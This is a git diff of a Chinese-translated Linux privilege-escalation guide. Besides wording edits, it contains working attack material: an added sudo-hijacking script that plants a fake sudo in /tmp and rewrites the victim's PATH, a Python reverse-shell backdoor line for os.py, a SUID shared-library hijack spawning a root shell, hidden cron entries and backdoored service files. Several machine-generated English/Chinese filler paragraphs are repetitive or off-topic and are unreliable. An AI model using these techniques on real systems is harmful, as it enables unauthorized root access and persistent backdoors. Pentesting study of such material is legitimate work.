 ### 隐形的cron任务
 
-可以通过在注释后面**插入一个回车符**（没有换行符）来创建一个cron任务，这个cron任务将会生效。示例（注意回车符）：
+可以通过在注释后面**插入一个回车符**（没有换行符）来创建一个cron任务，这样cron任务就会起作用。示例（注意回车符）：
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
@@ -606,7 +644,7 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 ### 可写的 _.service_ 文件
 
-检查是否可以写入任何 `.service` 文件，如果可以，你可以**修改它**，使其在服务**启动**、**重新启动**或**停止**时**执行**你的后门（也许你需要等待机器重启）。
+检查是否可以写入任何 `.service` 文件，如果可以，你可以**修改它**，以便在服务**启动**、**重新启动**或**停止**时**执行**你的后门（也许你需要等待机器重启）。\
 例如，在 .service 文件中创建你的后门，使用 **`ExecStart=/tmp/script.sh`**
 
 ### 可写的服务二进制文件
@@ -645,7 +683,7 @@ Unit=backdoor.service
 ```
 在文档中，您可以了解到什么是Unit：
 
-> 当此计时器到期时要激活的Unit。参数是一个Unit名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器Unit具有相同名称的Service（除了后缀）。建议激活的Unit名称和计时器Unit的Unit名称相同，除了后缀（参见上文）。
+> 当此计时器到期时要激活的Unit。参数是一个Unit名称，其后缀不是“.timer”。如果未指定，则此值默认为与计时器Unit具有相同名称的Service（除了后缀）。建议激活的Unit名称和计时器Unit的Unit名称相同，除了后缀。
 
 因此，要滥用此权限，您需要：
 
@@ -696,7 +734,7 @@ Establishing a raw connection is a technique used in privilege escalation to gai
 
 To establish a raw connection, you can use tools like `netcat` or `socat`. These tools allow you to create a network connection and interact with the target system directly.
 
-Once you have established a raw connection, you can execute commands on the target system with the privileges of the user account used to establish the connection. This can be useful for bypassing security measures and gaining unauthorized access to sensitive information or performing malicious actions.
+Once you have established a raw connection, you can execute commands and perform actions on the target system with the privileges of the user account used to establish the connection. This can be useful for bypassing security measures and gaining unauthorized access to sensitive information or performing malicious activities.
 
 It is important to note that establishing a raw connection may be detected by intrusion detection systems or monitored by system administrators. Therefore, it is crucial to use this technique responsibly and only in authorized scenarios, such as during penetration testing or when conducting security assessments.
 ```bash
@@ -715,7 +753,7 @@ socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of 
 
 ### HTTP套接字
 
-请注意，可能有一些**监听HTTP请求的套接字**（_我指的不是.socket文件，而是充当Unix套接字的文件_）。您可以使用以下命令进行检查：
+请注意，可能有一些**监听HTTP请求的套接字**（_我不是指.socket文件，而是充当Unix套接字的文件_）。您可以使用以下命令进行检查：
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
@@ -763,7 +801,7 @@ Upgrade: tcp
 
 请注意，如果您具有对docker套接字的写权限，因为您在`docker`组内，您有[**更多提升权限的方法**](interesting-groups-linux-pe/#docker-group)。如果[docker API正在监听一个端口，您也可以利用它进行攻击](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。
 
-在以下链接中查看有关**更多从docker中逃脱或滥用它提升权限的方法**：
+在以下链接中查看**更多从docker中突破或滥用它提升权限的方法**：
 
 {% content-ref url="docker-security/" %}
 [docker-security](docker-security/)
@@ -789,7 +827,7 @@ Upgrade: tcp
 
 D-Bus是一个**进程间通信（IPC）系统**，提供了一个简单而强大的机制，**允许应用程序相互通信**、交换信息和请求服务。D-Bus从头开始设计，以满足现代Linux系统的需求。
 
-作为一个功能齐全的IPC和对象系统，D-Bus有几个预期的用途。首先，D-Bus可以执行基本的应用程序IPC，允许一个进程将数据传输给另一个进程-类似于**功能强化的UNIX域套接字**。其次，D-Bus可以通过系统发送事件或信号，允许系统中的不同组件进行通信，并最终更好地集成。例如，蓝牙守护程序可以发送一个来电信号，您的音乐播放器可以拦截该信号，在通话结束之前静音音量。最后，D-Bus实现了一个远程对象系统，允许一个应用程序从不同的对象请求服务和调用方法-类似于没有复杂性的CORBA。（来自[这里](https://www.linuxjournal.com/article/7744)）。
+作为一个功能齐全的IPC和对象系统，D-Bus有几个预期的用途。首先，D-Bus可以执行基本的应用程序IPC，允许一个进程将数据传输给另一个进程-类似于**功能强化的UNIX域套接字**。其次，D-Bus可以通过系统发送事件或信号，允许系统中的不同组件进行通信，并最终更好地集成。例如，蓝牙守护程序可以发送一个来电信号，您的音乐播放器可以拦截该信号，将音量静音直到通话结束。最后，D-Bus实现了一个远程对象系统，允许一个应用程序从不同的对象请求服务和调用方法-类似于没有复杂性的CORBA。（来自[这里](https://www.linuxjournal.com/article/7744)）。
 
 D-Bus使用**允许/拒绝模型**，其中每个消息（方法调用、信号发射等）可以根据与之匹配的所有策略规则的总和进行**允许或拒绝**。策略中的每个规则应该设置`own`、`send_destination`或`receive_sender`属性。
 
@@ -938,7 +976,7 @@ grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/logi
 
 ### $PATH
 
-如果你发现你可以**在$PATH的某个文件夹中写入内容**，你可以通过在可写文件夹中创建一个名为将由不同用户（最好是root）执行的某个命令的后门来提升权限，而该命令**不是从位于你的可写文件夹之前的文件夹中加载的**。
+如果你发现你可以**在$PATH的某个文件夹中写入内容**，你可以通过在可写文件夹中创建一个名为将由不同用户（最好是root）执行的某个命令的后门来提升权限，并且该命令**不是从位于你的可写文件夹之前的文件夹加载的**。
 
 ### SUDO和SUID
 
@@ -1024,7 +1062,7 @@ export -f /usr/sbin/service
 
 ### LD\_PRELOAD和**LD\_LIBRARY\_PATH**
 
-**LD\_PRELOAD**是一个可选的环境变量，包含一个或多个共享库或共享对象的路径，加载器将在任何其他共享库之前加载它们，包括C运行时库(libc.so)。这被称为预加载库。
+**LD\_PRELOAD**是一个可选的环境变量，包含一个或多个共享库或共享对象的路径，加载器将在任何其他共享库之前加载它们，包括C运行时库（libc.so）。这被称为预加载库。
 
 为了防止这种机制被用作_suid/sgid_可执行二进制文件的攻击向量，如果_ruid != euid_，加载器将忽略_LD\_PRELOAD_。对于这样的二进制文件，只有标准路径中也是_suid/sgid_的库才会被预加载。
 
@@ -1119,7 +1157,7 @@ When the target program is executed, the dynamic linker/loader will search for t
 
 To prevent shared object hijacking, it is important to ensure that only trusted directories are searched by the dynamic linker/loader. This can be achieved by properly configuring the system's library search path and removing unnecessary or insecure directories from the search path.
 
-为了防止共享对象劫持，重要的是确保只有受信任的目录被动态链接器/加载器搜索。可以通过正确配置系统的库搜索路径，并从搜索路径中删除不必要或不安全的目录来实现这一点。
+为了防止共享对象劫持，重要的是确保只有受信任的目录被动态链接器/加载器搜索。可以通过正确配置系统的库搜索路径并从搜索路径中删除不必要或不安全的目录来实现这一点。
 ```bash
 # Lets find a SUID using a non-standard library
 ldd some_suid
@@ -1142,7 +1180,7 @@ setresuid(0,0,0);
 system("/bin/bash -p");
 }
 ```
-如果你遇到以下错误：
+如果你遇到类似以下错误的情况：
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
@@ -1233,20 +1271,35 @@ permit nopass demo as root cmd vim
 ```
 ### Sudo劫持
 
-如果你知道一个用户通常连接到一台机器并使用`sudo`来提升权限，而且你在该用户的上下文中获得了一个shell，那么你可以创建一个新的sudo可执行文件，它将以root权限执行你的代码，然后执行用户的命令。然后，修改用户上下文的$PATH（例如在.bash_profile中添加新路径），这样当用户执行sudo时，你的sudo可执行文件就会被执行。
+如果你知道一个用户通常连接到一台机器并使用`sudo`来提升权限，而且你已经在该用户的上下文中获得了一个shell，那么你可以创建一个新的sudo可执行文件，它将以root权限执行你的代码，然后执行用户的命令。然后，修改用户上下文的$PATH（例如在.bash\_profile中添加新路径），这样当用户执行sudo时，你的sudo可执行文件就会被执行。
 
-请注意，如果用户使用的是不同的shell（不是bash），你需要修改其他文件来添加新路径。例如[sudo-piggyback](https://github.com/APTy/sudo-piggyback)修改了`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)中找到另一个示例。
+请注意，如果用户使用的是不同的shell（不是bash），你需要修改其他文件来添加新路径。例如[sudo-piggyback](https://github.com/APTy/sudo-piggyback)修改了`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)中找到另一个示例。
 
+或者运行类似以下的命令：
+```bash
+cat >/tmp/sudo <<EOF
+#!/bin/bash
+/usr/bin/sudo whoami > /tmp/privesc
+/usr/bin/sudo "\$@"
+EOF
+chmod +x /tmp/sudo
+echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other
+
+# From the victim
+zsh
+echo $PATH
+sudo ls
+```
 ## 共享库
 
 ### ld.so
 
-文件`/etc/ld.so.conf`指示加载的配置文件的位置。通常，该文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`
+文件`/etc/ld.so.conf`指示了**加载的配置文件的位置**。通常，该文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`
 
-这意味着将读取`/etc/ld.so.conf.d/*.conf`中的配置文件。这些配置文件指向其他文件夹，其中将搜索库。例如，`/etc/ld.so.conf.d/libc.conf`的内容是`/usr/local/lib`。这意味着系统将在`/usr/local/lib`中搜索库。
+这意味着将读取`/etc/ld.so.conf.d/*.conf`中的配置文件。这些配置文件**指向其他文件夹**，其中将**搜索库**。例如，`/etc/ld.so.conf.d/libc.conf`的内容是`/usr/local/lib`。**这意味着系统将在`/usr/local/lib`中搜索库**。
 
-如果由于某种原因，用户对所指示的任何路径（`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/`中的任何文件或`/etc/ld.so.conf.d/*.conf`中的配置文件内的任何文件夹）具有写权限，他可能能够提升权限。
-在下面的页面中查看如何利用这个错误配置：
+如果由于某种原因，**用户对所指示的任何路径**：`/etc/ld.so.conf`，`/etc/ld.so.conf.d/`，`/etc/ld.so.conf.d/`中的任何文件或`/etc/ld.so.conf.d/*.conf`中的配置文件中的任何文件夹具有写权限，他可能能够提升权限。\
+请查看以下页面上**如何利用此配置错误**：
 
 {% content-ref url="ld.so.conf-example.md" %}
 [ld.so.conf-example.md](ld.so.conf-example.md)
@@ -1331,23 +1384,19 @@ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 screen -ls
 screen -ls <username>/ # Show another user' screen sessions
 ```
-**附加到会话**
+**连接到会话**
 
-To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain control over the session and execute commands with elevated privileges.
+To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain control over the session and execute commands with higher privileges. There are several methods to achieve this, including:
 
-There are several methods to attach to a session, depending on the circumstances and the tools available. Here are some common techniques:
+1. **Screen**: The `screen` command allows the hacker to create and manage multiple terminal sessions. By attaching to an existing screen session, the hacker can gain access to the session and execute commands as the user.
 
-1. **Screen**: The `screen` command allows you to attach to a detached session or create a new session. To attach to an existing session, use the command `screen -r <session_name>`. This will give you access to the session and its privileges.
+2. **tmux**: Similar to `screen`, `tmux` is a terminal multiplexer that allows the hacker to create and manage multiple terminal sessions. By attaching to an existing `tmux` session, the hacker can gain control over the session and execute commands with elevated privileges.
 
-2. **tmux**: Similar to `screen`, `tmux` is another terminal multiplexer that allows you to attach to existing sessions. To attach to a session, use the command `tmux attach-session -t <session_name>`.
+3. **SSH**: If the hacker has SSH access to the target system, they can use the `ssh` command to attach to an existing session. By specifying the `-t` option, the hacker can allocate a pseudo-terminal and gain control over the session.
 
-3. **SSH**: If you have SSH access to a remote system, you can use the `ssh` command to attach to a session. Use the command `ssh user@host -t "command"` to execute a command within the session.
+4. **Attach to a running process**: In some cases, it may be possible to attach to a running process and gain control over the session. This can be done using tools like `strace` or `gdb` to attach to the process and execute commands with higher privileges.
 
-4. **Debuggers**: Debuggers like `gdb` or `lldb` can also be used to attach to a running process and gain control over its execution. This technique is often used for privilege escalation in binary exploitation scenarios.
-
-5. **Job control**: If you have access to a shell session, you can use job control to attach to a suspended process. Use the command `fg` to bring the process to the foreground and gain control over it.
-
-Remember, attaching to a session requires some level of access to the system. It is important to use these techniques responsibly and only on systems that you have permission to access.
+It is important to note that attaching to a session requires some level of access to the target system. Therefore, it is often used as a privilege escalation technique after gaining initial access to the system.
 ```bash
 screen -dr <session> #The -d is to detach whoever is attached to it
 screen -dr 3350.foo #In the example of the image
@@ -1365,15 +1414,17 @@ tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session i
 ```
 **连接到会话**
 
-To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain control over the session and execute commands with higher privileges. There are several methods to achieve this, depending on the specific circumstances.
+To escalate privileges on a Linux system, it is often necessary to attach to an existing session. This allows the hacker to gain control over the session and execute commands with higher privileges. There are several methods to achieve this, including:
 
-One common method is to exploit vulnerabilities in the session management system. This can be done by finding and exploiting bugs in the software that handles session creation and management. By exploiting these vulnerabilities, the hacker can gain unauthorized access to a session and escalate their privileges.
+1. **Screen**: The `screen` command allows the hacker to create and manage multiple terminal sessions. By attaching to an existing screen session, the hacker can gain access to the session and execute commands as the user.
 
-Another method is to hijack an existing session. This can be done by stealing the session token or session ID of a legitimate user. Once the hacker has obtained this information, they can use it to authenticate themselves as the legitimate user and gain control over their session.
+2. **tmux**: Similar to `screen`, `tmux` is a terminal multiplexer that allows the hacker to create and manage multiple terminal sessions. By attaching to an existing `tmux` session, the hacker can gain control over the session and execute commands with elevated privileges.
 
-In some cases, it may be possible to attach to a session by brute-forcing the session ID. This involves trying different session IDs until a valid one is found. This method can be time-consuming and may not always be successful, but it can be effective in certain situations.
+3. **SSH**: If the hacker has SSH access to the target system, they can use the `ssh` command to attach to an existing session. By specifying the `-t` option, the hacker can allocate a pseudo-terminal and gain control over the session.
 
-It is important to note that attaching to a session without proper authorization is illegal and unethical. This information is provided for educational purposes only and should not be used for any malicious activities.
+4. **Attach to a running process**: In some cases, it may be possible to attach to a running process and gain control over the session. This can be done using tools like `strace` or `gdb` to attach to the process and execute commands with higher privileges.
+
+It is important to note that attaching to a session requires some level of access to the target system. Therefore, it is often used as a privilege escalation technique after gaining initial access to the system.
 ```bash
 tmux attach -t myname #If you write something in this session it will appears in the other opened one
 tmux attach -d -t myname #First detach the session from the other console and then access it yourself
@@ -1426,7 +1477,7 @@ ForwardAgent yes
 ```
 请注意，如果`Host`是`*`，每次用户跳转到不同的机器时，该主机将能够访问密钥（这是一个安全问题）。
 
-文件`/etc/ssh_config`可以**覆盖**这个**选项**，允许或拒绝这个配置。\
+文件`/etc/ssh_config`可以**覆盖**这个**选项**，允许或拒绝此配置。\
 文件`/etc/sshd_config`可以使用关键字`AllowAgentForwarding`（默认为允许）来**允许**或**拒绝**ssh-agent转发。
 
 如果您发现在某个环境中配置了Forward Agent，请阅读以下页面，因为**您可能能够利用它来提升权限**：
@@ -1503,35 +1554,33 @@ ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
 ```
 ### 异常位置/被占有的文件
 
-When performing privilege escalation on a Linux system, it is important to look for files that are located in unusual or unexpected locations, as well as files that are owned by privileged users. These files can potentially be leveraged to gain higher levels of access.
+During a privilege escalation attack, it is important to identify any files or directories that are located in unusual or unexpected locations, as well as files that are owned by privileged users. These files can potentially be used to gain elevated privileges on a system.
 
-Here are some common locations and files to check:
+在特权升级攻击中，识别位于异常或意外位置的文件或目录以及由特权用户拥有的文件非常重要。这些文件有可能被用于在系统上获得提升的特权。
 
-#### /tmp Directory
+Here are some techniques to identify such files:
 
-The `/tmp` directory is a common location for temporary files. Attackers may place malicious scripts or binaries in this directory to escalate privileges. Look for files with unusual names or file extensions, as well as files owned by privileged users.
+以下是一些识别此类文件的技术：
 
-#### /var/tmp Directory
+1. **Find files outside of common directories**: Look for files that are located outside of common system directories such as `/bin`, `/usr/bin`, `/sbin`, `/usr/sbin`, and `/etc`. These files may be hidden or overlooked by system administrators.
 
-Similar to the `/tmp` directory, the `/var/tmp` directory is another location where temporary files are stored. Check for suspicious files or files owned by privileged users.
+   **查找常见目录之外的文件**：寻找位于常见系统目录之外的文件，例如`/bin`、`/usr/bin`、`/sbin`、`/usr/sbin`和`/etc`。这些文件可能被系统管理员隐藏或忽略。
 
-#### World-Writable Directories
+2. **Check for files with unusual permissions**: Identify files that have unusual permissions, such as world-writable files (`chmod 777`) or files owned by privileged users (`root`, `admin`, etc.). These files may be vulnerable to manipulation or exploitation.
 
-Directories that have the write permission for all users (`777` permission) can be potential targets for privilege escalation. Attackers can place malicious files in these directories and execute them to gain elevated privileges. Look for directories with the `777` permission and investigate the files within them.
+   **检查具有异常权限的文件**：识别具有异常权限的文件，例如全局可写文件（`chmod 777`）或由特权用户（`root`、`admin`等）拥有的文件。这些文件可能容易受到操纵或利用。
 
-#### SUID/SGID Files
+3. **Look for files with SUID/SGID permissions**: Search for files that have the Set User ID (SUID) or Set Group ID (SGID) permissions set. These permissions allow a user to execute a file with the privileges of the file owner or group, which can be exploited for privilege escalation.
 
-SUID (Set User ID) and SGID (Set Group ID) are special permissions that can be assigned to executable files. When a user executes an SUID/SGID file, the process runs with the privileges of the file owner or group owner, respectively. Check for files with these permissions, as they can be used to escalate privileges.
+   **查找具有SUID/SGID权限的文件**：搜索具有设置用户ID（SUID）或设置组ID（SGID）权限的文件。这些权限允许用户以文件所有者或组的权限执行文件，可以被利用进行特权升级。
 
-#### Configuration Files
+4. **Identify files with unusual file extensions**: Look for files with uncommon or unexpected file extensions, as they may indicate the presence of hidden or disguised files.
 
-Configuration files, such as those found in the `/etc` directory, may contain sensitive information or be misconfigured, allowing privilege escalation. Look for files with weak permissions or files that are owned by privileged users.
+   **识别具有异常文件扩展名的文件**：寻找具有不常见或意外文件扩展名的文件，因为它们可能表示存在隐藏或伪装的文件。
 
-#### Custom Scripts and Binaries
+By identifying and investigating files in these categories, you can potentially discover vulnerabilities or misconfigurations that can be leveraged for privilege escalation during a penetration test.
 
-Check for any custom scripts or binaries that are not part of the standard Linux distribution. Attackers may place malicious files in these locations to escalate privileges. Look for files with unusual names or files owned by privileged users.
-
-By examining these locations and files, you can identify potential vulnerabilities that can be exploited for privilege escalation on a Linux system.
+通过识别和调查这些类别的文件，您有可能发现可以在渗透测试期间利用的漏洞或配置错误。
 ```bash
 #root owned files in /home folders
 find /home -user root 2>/dev/null
@@ -1570,16 +1619,16 @@ Sqlite是一种轻量级的嵌入式数据库引擎，常用于移动应用和�
 
 在特定的情况下，访问和分析Sqlite数据库文件可能会成为特权升级的一种方法。这是因为某些应用程序可能会在数据库文件中存储敏感信息，如密码、密钥或其他凭据。通过获取对这些文件的访问权限，黑客可以进一步探索系统并获取更高的权限。
 
-在进行Sqlite数据库文件的特权升级时，黑客可以使用各种技术和工具。这些包括查找可写的目录、利用应用程序漏洞、使用特权升级脚本等。黑客还可以使用Sqlite数据库文件的特殊功能和语法来执行恶意操作，如注入恶意代码或执行未授权的查询。
+在进行Sqlite数据库文件的特权升级时，黑客可以使用各种技术和工具。这包括查找可读取或可写入数据库文件的目录、利用文件权限配置错误、利用应用程序漏洞以及使用特权升级脚本等。
 
 为了保护系统免受Sqlite数据库文件的特权升级攻击，建议采取以下措施：
 
-- 限制对数据库文件的访问权限，确保只有授权用户可以读取和写入这些文件。
-- 定期更新和修补应用程序，以防止已知的漏洞被利用。
-- 使用强密码和加密算法来保护数据库文件中的敏感信息。
-- 监控系统日志，及时发现和响应任何异常活动。
+- 限制对数据库文件的访问权限，确保只有授权用户可以读取或写入这些文件。
+- 定期更新和修补应用程序，以防止潜在的漏洞被利用。
+- 使用强密码和加密技术来保护数据库文件中的敏感信息。
+- 监控系统日志，及时发现和应对任何异常活动。
 
-通过采取这些措施，可以增强系统对Sqlite数据库文件特权升级攻击的防御能力，并保护用户的数据安全。
+通过采取这些措施，可以增强系统对Sqlite数据库文件特权升级攻击的防护能力。
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
@@ -1609,23 +1658,35 @@ find / -type f -iname ".*" -ls 2>/dev/null
 
 One common privilege escalation technique is to exploit the presence of scripts or binaries in the system's PATH. The PATH is an environment variable that contains a list of directories where the operating system looks for executable files.
 
-By placing a malicious script or binary with the same name as a commonly used command in one of the directories listed in the PATH, an attacker can trick the system into executing the malicious code instead of the legitimate command.
+攻击者常用的一种提权技术是利用系统路径中存在的脚本或可执行文件。路径（PATH）是一个环境变量，其中包含操作系统用于查找可执行文件的目录列表。
 
-To identify potential vulnerabilities related to scripts or binaries in the PATH, follow these steps:
+If a script or binary with higher privileges is placed in a directory that appears earlier in the PATH than the legitimate one, the system will execute the malicious version instead. This can allow an attacker to execute arbitrary commands with elevated privileges.
 
-1. List the directories in the PATH by running the command:
+如果将具有较高权限的脚本或可执行文件放置在路径中出现在合法版本之前的目录中，系统将执行恶意版本。这可以使攻击者以提升的权限执行任意命令。
 
-   ```bash
-   echo $PATH
-   ```
+To identify potential vulnerabilities related to scripts or binaries in the PATH, you can perform the following steps:
 
-2. For each directory listed, check if there are any scripts or binaries with names similar to commonly used commands. For example, look for files named `sudo`, `su`, `ssh`, etc.
+要识别与路径中的脚本或可执行文件相关的潜在漏洞，可以执行以下步骤：
 
-3. Verify the permissions of these files. If they are writable by the current user or have elevated permissions, it may indicate a potential vulnerability.
+1. List the directories in the PATH by running the command `echo $PATH`.
 
-4. Inspect the contents of these files to determine if they contain malicious code. Look for any suspicious or unexpected commands or functions.
+   运行命令 `echo $PATH` 列出路径中的目录。
 
-If you find any suspicious files, it is recommended to remove or rename them to prevent potential privilege escalation attacks. Additionally, ensure that the directories in the PATH have proper permissions and only contain trusted scripts or binaries.
+2. For each directory, check the permissions of the files within it. Look for files that have the setuid or setgid permissions, as these can indicate potential vulnerabilities.
+
+   对于每个目录，检查其中文件的权限。查找具有 setuid 或 setgid 权限的文件，因为这可能表示潜在的漏洞。
+
+3. Review the contents of each directory and identify any scripts or binaries that have higher privileges than expected. Pay attention to files owned by privileged users or groups.
+
+   查看每个目录的内容，识别任何具有比预期更高权限的脚本或可执行文件。注意特权用户或组所拥有的文件。
+
+4. If you find any suspicious files, investigate their purpose and determine if they can be leveraged for privilege escalation.
+
+   如果发现任何可疑文件，请调查其用途，并确定它们是否可以用于提权。
+
+By carefully examining the scripts and binaries in the PATH, you can identify potential vulnerabilities and take appropriate actions to mitigate the risk of privilege escalation attacks.
+
+通过仔细检查路径中的脚本和可执行文件，您可以识别潜在的漏洞，并采取适当的措施来减轻提权攻击的风险。
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
 for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
@@ -1669,37 +1730,37 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```
 ### **备份**
 
-Backups are an essential part of any system's security strategy. They help protect against data loss and can be a lifesaver in the event of a system compromise or hardware failure. It is important to have a robust backup system in place to ensure that critical data can be restored quickly and efficiently.
+Backups are an essential part of any system's security strategy. They help protect against data loss and can be a lifesaver in the event of a system compromise or hardware failure. It is important to have a robust backup plan in place to ensure that critical data is regularly backed up and can be easily restored if needed.
 
-备份是任何系统安全策略的重要组成部分。它们有助于防止数据丢失，并在系统受到威胁或硬件故障时起到救命稻草的作用。建立一个强大的备份系统非常重要，以确保关键数据可以快速高效地恢复。
+备份是任何系统安全策略的重要组成部分。它们有助于防止数据丢失，并且在系统受到威胁或硬件故障时可以拯救生命。建立一个强大的备份计划非常重要，以确保关键数据定期备份，并在需要时可以轻松恢复。
 
 #### **Backup Best Practices**
 
 #### **备份最佳实践**
 
-- **Regular backups**: Perform regular backups of all critical data. This ensures that the most up-to-date version of the data is available for restoration.
+- **Regular backups**: Schedule regular backups to ensure that all critical data is backed up frequently. This can be done using automated backup tools or scripts.
 
-- **定期备份**：定期备份所有关键数据。这样可以确保最新版本的数据可用于恢复。
+- **定期备份**：安排定期备份，以确保所有关键数据经常备份。可以使用自动备份工具或脚本来完成此操作。
 
-- **Offsite backups**: Store backups in an offsite location to protect against physical damage or theft. This can be done by using cloud storage or by physically storing backups in a different location.
+- **Offsite backups**: Store backups in an offsite location to protect against physical damage or theft. This can be a cloud storage service or a separate physical location.
 
-- **离线备份**：将备份存储在离线位置，以防止物理损坏或盗窃。可以通过使用云存储或在不同位置物理存储备份来实现。
+- **离线备份**：将备份存储在离线位置，以防止物理损坏或盗窃。这可以是云存储服务或单独的物理位置。
 
 - **Encryption**: Encrypt backups to protect sensitive data from unauthorized access. This ensures that even if the backups are compromised, the data remains secure.
 
 - **加密**：对备份进行加密，以保护敏感数据免受未经授权的访问。这样即使备份被攻击，数据也能保持安全。
 
-- **Testing backups**: Regularly test backups to ensure that they can be successfully restored. This helps identify any issues or errors in the backup process before they are needed.
+- **Testing backups**: Regularly test backups to ensure that they can be successfully restored. This helps identify any issues with the backup process and ensures that the data can be recovered when needed.
 
-- **测试备份**：定期测试备份，以确保可以成功恢复。这有助于在需要之前发现备份过程中的任何问题或错误。
+- **测试备份**：定期测试备份，以确保可以成功恢复。这有助于识别备份过程中的任何问题，并确保在需要时可以恢复数据。
 
-- **Backup rotation**: Implement a backup rotation strategy to ensure that multiple copies of backups are available. This helps protect against data corruption or accidental deletion.
+- **Retention policy**: Define a retention policy that specifies how long backups should be kept. This helps manage storage space and ensures that backups are not kept longer than necessary.
 
-- **备份轮换**：实施备份轮换策略，以确保有多个备份副本可用。这有助于防止数据损坏或意外删除。
+- **保留策略**：定义一个保留策略，指定备份应保留多长时间。这有助于管理存储空间，并确保备份不会超过必要的时间。
 
-- **Monitoring**: Monitor backup processes to ensure that they are running successfully and that backups are being created as expected.
+- **Monitoring**: Implement monitoring to ensure that backups are running successfully and to detect any failures or issues. This allows for timely resolution and prevents data loss.
 
-- **监控**：监控备份过程，确保它们成功运行，并按预期创建备份。
+- **监控**：实施监控以确保备份成功运行，并检测任何故障或问题。这可以及时解决问题，防止数据丢失。
 
 By following these backup best practices, you can ensure that your critical data is protected and can be easily restored in the event of a system compromise or data loss.
 
@@ -1742,7 +1803,7 @@ grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 
 ### Python库劫持
 
-如果你知道一个Python脚本将在哪里执行，并且你可以在该文件夹中**写入**或者你可以**修改Python库**，你可以修改操作系统库并植入后门（如果你可以在Python脚本将要执行的地方写入，请复制并粘贴os.py库）。
+如果你知道一个Python脚本将在哪里执行，并且你可以在该文件夹中**写入**或者你可以**修改Python库**，你可以修改操作系统库并在其中植入后门（如果你可以在Python脚本将要执行的地方写入，请复制并粘贴os.py库）。
 
 要**植入后门**，只需在os.py库的末尾添加以下行（更改IP和端口）：
 ```python
@@ -1750,9 +1811,9 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 ```
 ### Logrotate漏洞利用
 
-`logrotate`存在一个漏洞，允许具有**对日志文件或其任何父目录的写权限**的用户在**任何位置**上写入文件。如果**root**执行了**logrotate**，那么用户将能够在任何用户登录时执行的_**/etc/bash\_completion.d/**_中写入任何文件。
+`logrotate`存在一个漏洞，允许具有**对日志文件或其任何父目录的写权限**的用户在**任何位置**上写入文件。如果**root**执行了**logrotate**，那么用户将能够在_**/etc/bash\_completion.d/**_中写入任何文件，并由任何登录的用户执行。
 
-因此，如果您对**日志文件**或其**父文件夹**具有**写权限**，则可以进行**特权升级**（在大多数Linux发行版上，logrotate每天自动以**root用户**身份执行）。此外，请检查是否除了_/var/log_之外还有其他文件被**轮换**。
+因此，如果您对**日志文件**或其**父文件夹**具有**写权限**，则可以进行**特权升级**（在大多数Linux发行版中，logrotate每天自动以**root用户**身份执行）。此外，请检查是否除了_/var/log_之外还有其他文件被**轮换**。
 
 {% hint style="info" %}
 此漏洞影响`logrotate`版本`3.18.0`及更早版本
@@ -1782,11 +1843,11 @@ DEVICE=eth0
 
 ### **init、init.d、systemd和rc.d**
 
-`/etc/init.d` 包含了 System V init 工具（SysVinit）使用的 **脚本**。这是 Linux 的传统服务管理包，包含了 `init` 程序（在内核完成初始化后运行的第一个进程¹）以及一些用于启动、停止服务和配置服务的基础设施。具体来说，`/etc/init.d` 中的文件是 shell 脚本，用于响应 `start`、`stop`、`restart` 和（如果支持）`reload` 命令来管理特定的服务。这些脚本可以直接调用，也可以通过其他触发器（通常是在 `/etc/rc?.d/` 中存在符号链接）来调用（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。在 Redhat 中，这个文件夹的另一个替代位置是 `/etc/rc.d/init.d`。
+`/etc/init.d` 包含了 System V init 工具（SysVinit）使用的**脚本**。这是 Linux 的传统服务管理包，包含了 `init` 程序（在内核完成初始化后运行的第一个进程¹）以及一些用于启动、停止服务和配置服务的基础设施。具体来说，`/etc/init.d` 中的文件是 shell 脚本，用于响应 `start`、`stop`、`restart` 和（如果支持）`reload` 命令来管理特定的服务。这些脚本可以直接调用，也可以通过其他触发器（通常是在 `/etc/rc?.d/` 中存在符号链接）来调用（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。在 Redhat 中，这个文件夹的另一个替代品是 `/etc/rc.d/init.d`。
 
